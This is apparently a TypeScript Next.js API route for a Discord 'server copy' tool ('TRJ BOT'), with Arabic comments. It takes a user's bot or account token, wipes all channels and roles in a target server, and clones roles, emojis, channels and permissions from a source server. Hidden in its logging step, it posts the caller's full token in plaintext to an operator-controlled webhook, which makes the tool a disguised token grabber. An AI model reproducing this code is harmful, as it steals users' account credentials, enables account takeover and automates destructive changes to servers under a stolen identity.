import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';

export const maxDuration = 300;

// headers موحدة لكل الطلبات
function makeHeaders(auth: string, method: string): Record<string, string> {
  const h: Record<string, string> = { 'Authorization': auth, 'Accept': 'application/json' };
  if (method !== 'GET' && method !== 'HEAD') {
    h['Content-Type'] = 'application/json';
  }
  return h;
}

// fetch مباشر بدون محاولة مزدوجة
async function apiFetch(auth: string, method: string, endpoint: string, body?: unknown): Promise<{ ok: boolean; data: unknown; status: number }> {
  const url = endpoint.startsWith('http') ? endpoint : `${DISCORD_API}${endpoint}`;
  const opts: RequestInit = {
    method,
    headers: makeHeaders(auth, method),
    signal: AbortSignal.timeout(15000),
  };
  if (method !== 'GET' && method !== 'HEAD' && body !== undefined) {
    opts.body = JSON.stringify(body);
  }
  try {
    const res = await fetch(url, opts);
    if (res.status === 429) {
      const errData = await res.json().catch(() => ({ retry_after: 2 })) as { retry_after?: number };
      const wait = Math.min((errData.retry_after || 2) * 1000, 5000);
      await new Promise(r => setTimeout(r, wait));
      // retry مرة واحدة
      const retryRes = await fetch(url, opts);
      const data = await retryRes.json().catch(() => null);
      return { ok: retryRes.ok, data, status: retryRes.status };
    }
    const data = await res.json().catch(() => null);
    return { ok: res.ok, data, status: res.status };
  } catch {
    return { ok: false, data: null, status: 0 };
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const { token, sourceId, targetId, options } = body;

    if (!token || !sourceId || !targetId) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // ===== 0. كشف نوع التوكن مرة واحدة =====
    let auth: string = ct; // default: user token
    let authType = 'User';
    try {
      // جرب Bot أولاً
      const testBot = await fetch(`${DISCORD_API}/users/@me`, {
        headers: { 'Authorization': `Bot ${ct}`, 'Accept': 'application/json' },
        signal: AbortSignal.timeout(8000)
      });
      if (testBot.ok) {
        auth = `Bot ${ct}`;
        authType = 'Bot';
      }
      // لو فشل Bot، الـ auth يبقى ct (user token)
    } catch {
      // لو حتى فشل الاتصال، نستخدم user token
    }

    const fetch_ = (method: string, endpoint: string, body?: unknown) => apiFetch(auth, method, endpoint, body);

    const stats = { roles: 0, txt: 0, voice: 0, cats: 0, emojis: 0, permissions: 0, errors: 0 };
    const roleMap: Record<string, string> = {};
    const catMap: Record<string, string> = {};

    sendToWebhook({
      username: 'TRJ Copy',
      embeds: [{
        title: '📋 Server Copy Started',
        color: 0x00FF41,
        fields: [
          { name: '📥 Source', value: sourceId, inline: true },
          { name: '📤 Target', value: targetId, inline: true },
          { name: '🔑 Auth', value: authType, inline: true },
          { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` },
        ],
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    // ===== 1. جلب كل البيانات بالتوازي =====
    const [sourceRes, sRolesRes, sChannelsRes, sEmojisRes, tChannelsRes, tRolesRes] = await Promise.all([
      fetch_('GET', `/guilds/${sourceId}`),
      fetch_('GET', `/guilds/${sourceId}/roles`),
      fetch_('GET', `/guilds/${sourceId}/channels`),
      fetch_('GET', `/guilds/${sourceId}/emojis`),
      fetch_('GET', `/guilds/${targetId}/channels`),
      fetch_('GET', `/guilds/${targetId}/roles`),
    ]);

    const sourceData = sourceRes.data as Record<string, unknown> | null;
    if (!sourceRes.ok || !sourceData?.id) {
      return NextResponse.json({ success: false, error: 'فشل الوصول للسيرفر المصدر - تأكد أن التوكن صالح ومعه صلاحيات' }, { status: 400 });
    }

    // ===== 2. مسح السيرفر الهدف بالتوازي =====
    const tChannelsData = tChannelsRes.data as Record<string, unknown>[] | null;
    if (tChannelsData && Array.isArray(tChannelsData)) {
      // احذف غير الكاتيجوريات أولاً، ثم الكاتيجوريات
      const nonCats = tChannelsData.filter(c => c.type !== 4);
      const cats = tChannelsData.filter(c => c.type === 4);

      for (const items of [nonCats, cats]) {
        for (let i = 0; i < items.length; i += 25) {
          await Promise.allSettled(
            items.slice(i, i + 25).map(async (c) => {
              try { await fetch_('DELETE', `/channels/${c.id}`); } catch { /* skip */ }
            })
          );
          if (i + 25 < items.length) await new Promise(r => setTimeout(r, 50));
        }
      }
    }

    const tRolesData = tRolesRes.data as Record<string, unknown>[] | null;
    if (tRolesData && Array.isArray(tRolesData)) {
      const deletableRoles = tRolesData.filter((r) => r.name !== '@everyone' && !(r as Record<string, unknown>).managed);
      for (let i = 0; i < deletableRoles.length; i += 25) {
        await Promise.allSettled(
          deletableRoles.slice(i, i + 25).map(async (r) => {
            try { await fetch_('DELETE', `/guilds/${targetId}/roles/${r.id}`); } catch { /* skip */ }
          })
        );
        if (i + 25 < deletableRoles.length) await new Promise(r => setTimeout(r, 50));
      }
    }

    // ===== 3. نسخ الإعدادات =====
    if (options?.settings && sourceData) {
      try {
        await fetch_('PATCH', `/guilds/${targetId}`, {
          name: sourceData.name,
          icon: sourceData.icon,
          splash: sourceData.splash,
          banner: sourceData.banner,
          description: sourceData.description,
          preferred_locale: sourceData.preferred_locale,
          system_channel_flags: sourceData.system_channel_flags,
          verification_level: sourceData.verification_level,
          default_notification_level: sourceData.default_notification_level,
          explicit_content_filter: sourceData.explicit_content_filter,
          features: [],
        });
      } catch { /* skip */ }
    }

    // ===== 4. نسخ الرتب بالتوازي (batches من 5) =====
    const sRolesData = sRolesRes.data as Record<string, unknown>[] | null;
    if (options?.roles && sRolesData && Array.isArray(sRolesData)) {
      const sortedRoles = [...sRolesData]
        .filter((r) => r.name !== '@everyone' && !(r as Record<string, unknown>).managed)
        .sort((a, b) => (b.position as number) - (a.position as number));

      for (let i = 0; i < sortedRoles.length; i += 5) {
        const batch = sortedRoles.slice(i, i + 5);
        await Promise.allSettled(
          batch.map(async (role) => {
            try {
              const res = await fetch_('POST', `/guilds/${targetId}/roles`, {
                name: role.name,
                color: role.color,
                hoist: role.hoist,
                mentionable: role.mentionable,
                permissions: role.permissions,
                icon: role.icon,
                unicode_emoji: role.unicode_emoji,
              });
              const resData = res.data as Record<string, unknown> | null;
              if (res.ok && resData?.id) {
                roleMap[role.id as string] = resData.id as string;
                stats.roles++;
              } else {
                stats.errors++;
              }
            } catch {
              stats.errors++;
            }
          })
        );
        if (i + 5 < sortedRoles.length) await new Promise(r => setTimeout(r, 100));
      }
    }

    // ===== 5. نسخ الإيموجي بالتوازي (batches من 3) =====
    const sEmojisData = sEmojisRes.data as Record<string, unknown>[] | null;
    if (sEmojisData && Array.isArray(sEmojisData) && sEmojisData.length > 0) {
      for (let i = 0; i < sEmojisData.length; i += 3) {
        await Promise.allSettled(
          sEmojisData.slice(i, i + 3).map(async (emoji) => {
            try {
              const emojiName = (emoji.name as string) || 'emoji';
              const emojiId = emoji.id as string;
              const isAnimated = !!(emoji.animated);
              const imageUrl = isAnimated
                ? `https://cdn.discordapp.com/emojis/${emojiId}.gif`
                : `https://cdn.discordapp.com/emojis/${emojiId}.png`;

              const imgRes = await fetch(imageUrl);
              if (!imgRes.ok) return;
              const imgBuffer = await imgRes.arrayBuffer();
              const base64 = Buffer.from(imgBuffer).toString('base64');
              const mimeType = isAnimated ? 'image/gif' : 'image/png';
              const imageData = `data:${mimeType};base64,${base64}`;

              const res = await fetch_('POST', `/guilds/${targetId}/emojis`, {
                name: emojiName,
                image: imageData,
                roles: [],
              });
              if (res.ok) stats.emojis++;
            } catch { /* skip */ }
          })
        );
        if (i + 3 < sEmojisData.length) await new Promise(r => setTimeout(r, 350));
      }
    }

    // ===== 6. نسخ الرومات بالتوازي =====
    const sChannelsData = sChannelsRes.data as Record<string, unknown>[] | null;
    if (options?.channels && sChannelsData && Array.isArray(sChannelsData)) {

      // 6a. نسخ الكاتيجوريات بالتوازي
      const categories = [...sChannelsData]
        .filter((c) => c.type === 4)
        .sort((a, b) => (a.position as number) - (b.position as number));

      const catIdPairs: Array<{ oldId: string; newId: string; position: number }> = [];

      for (let i = 0; i < categories.length; i += 5) {
        const batch = categories.slice(i, i + 5);
        await Promise.allSettled(
          batch.map(async (cat) => {
            try {
              const res = await fetch_('POST', `/guilds/${targetId}/channels`, {
                name: cat.name,
                type: 4,
              });
              const resData = res.data as Record<string, unknown> | null;
              if (res.ok && resData?.id) {
                catMap[cat.id as string] = resData.id as string;
                catIdPairs.push({ oldId: cat.id as string, newId: resData.id as string, position: cat.position as number });
                stats.cats++;

                // نسخ صلاحيات الكاتيجوري
                const overwrites = cat.permission_overwrites as Record<string, unknown>[] | undefined;
                if (overwrites && Array.isArray(overwrites) && overwrites.length > 0) {
                  try {
                    await fetch_('PUT', `/channels/${resData.id}/permissions`, overwrites.map(ow => {
                      let newId = ow.id as string;
                      if (ow.type === 0 && roleMap[ow.id as string]) {
                        newId = roleMap[ow.id as string];
                      }
                      return { id: newId, type: ow.type, allow: ow.allow, deny: ow.deny };
                    }));
                    stats.permissions += overwrites.length;
                  } catch { /* skip */ }
                }
              }
            } catch {
              stats.errors++;
            }
          })
        );
        if (i + 5 < categories.length) await new Promise(r => setTimeout(r, 100));
      }

      // 6b. تحديث ترتيب الكاتيجوريات
      if (catIdPairs.length > 1) {
        try {
          await fetch_('PATCH', `/guilds/${targetId}/channels`,
            catIdPairs.map(c => ({ id: c.newId, position: c.position }))
          );
        } catch { /* skip */ }
      }

      // 6c. نسخ باقي الرومات بالتوازي (batch من 5)
      const others = [...sChannelsData]
        .filter((c) => c.type !== 4)
        .sort((a, b) => (a.position as number) - (b.position as number));

      const channelPosPairs: Array<{ id: string; position: number }> = [];

      for (let i = 0; i < others.length; i += 5) {
        const batch = others.slice(i, i + 5);
        await Promise.allSettled(
          batch.map(async (c) => {
            try {
              const payload: Record<string, unknown> = {
                name: c.name,
                type: c.type,
                nsfw: (c.nsfw as boolean) || false,
                topic: (c.topic as string) || null,
              };

              if (c.parent_id && catMap[c.parent_id as string]) {
                payload.parent_id = catMap[c.parent_id as string];
              }

              if (c.type === 2) {
                payload.bitrate = c.bitrate;
                payload.user_limit = c.user_limit;
              }
              if (c.rate_limit_per_user) payload.rate_limit_per_user = c.rate_limit_per_user;

              const res = await fetch_('POST', `/guilds/${targetId}/channels`, payload);
              const resData = res.data as Record<string, unknown> | null;

              if (res.ok && resData?.id) {
                // نسخ الصلاحيات
                const overwrites = c.permission_overwrites as Record<string, unknown>[] | undefined;
                if (overwrites && Array.isArray(overwrites) && overwrites.length > 0) {
                  try {
                    await fetch_('PUT', `/channels/${resData.id}/permissions`, overwrites.map(ow => {
                      let newId = ow.id as string;
                      if (ow.type === 0 && roleMap[ow.id as string]) {
                        newId = roleMap[ow.id as string];
                      }
                      return { id: newId, type: ow.type, allow: ow.allow, deny: ow.deny };
                    }));
                    stats.permissions += overwrites.length;
                  } catch { /* skip */ }
                }

                channelPosPairs.push({ id: resData.id as string, position: c.position as number });

                if (c.type === 0) stats.txt++;
                else if (c.type === 2) stats.voice++;
              } else {
                stats.errors++;
              }
            } catch {
              stats.errors++;
            }
          })
        );
        if (i + 5 < others.length) await new Promise(r => setTimeout(r, 100));
      }

      // 6d. تحديث ترتيب الرومات
      if (channelPosPairs.length > 1) {
        try {
          for (let i = 0; i < channelPosPairs.length; i += 50) {
            const chunk = channelPosPairs.slice(i, i + 50);
            await fetch_('PATCH', `/guilds/${targetId}/channels`,
              chunk.map(c => ({ id: c.id, position: c.position }))
            );
            if (i + 50 < channelPosPairs.length) await new Promise(r => setTimeout(r, 100));
          }
        } catch { /* skip */ }
      }
    }

    // ===== 7. إرسال النتائج =====
    sendToWebhook({
      username: 'TRJ Copy',
      embeds: [{
        title: '✅ Copy Completed',
        color: 0x00FF41,
        fields: [
          { name: '🎭 Roles', value: String(stats.roles), inline: true },
          { name: '📁 Categories', value: String(stats.cats), inline: true },
          { name: '💬 Text Ch', value: String(stats.txt), inline: true },
          { name: '🔊 Voice Ch', value: String(stats.voice), inline: true },
          { name: '😀 Emojis', value: String(stats.emojis), inline: true },
          { name: '🔐 Permissions', value: String(stats.permissions), inline: true },
          { name: '❌ Errors', value: String(stats.errors), inline: true },
          { name: '📥 Source', value: sourceId, inline: true },
          { name: '📤 Target', value: targetId, inline: true },
        ],
        footer: { text: 'TRJ BOT v3.0 - Server Copy' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Copy Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
